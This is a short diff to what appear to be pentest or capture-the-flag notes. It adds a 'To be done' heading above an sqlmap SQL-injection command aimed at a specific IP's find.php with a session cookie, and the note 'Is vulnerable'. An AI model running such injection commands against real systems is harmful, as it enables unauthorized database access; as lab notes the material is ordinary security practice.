@@ -1,3 +1,8 @@
+To be done
+
+--notes--
+=========
+
 sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f' -p "username"
 
 Is vulnerable
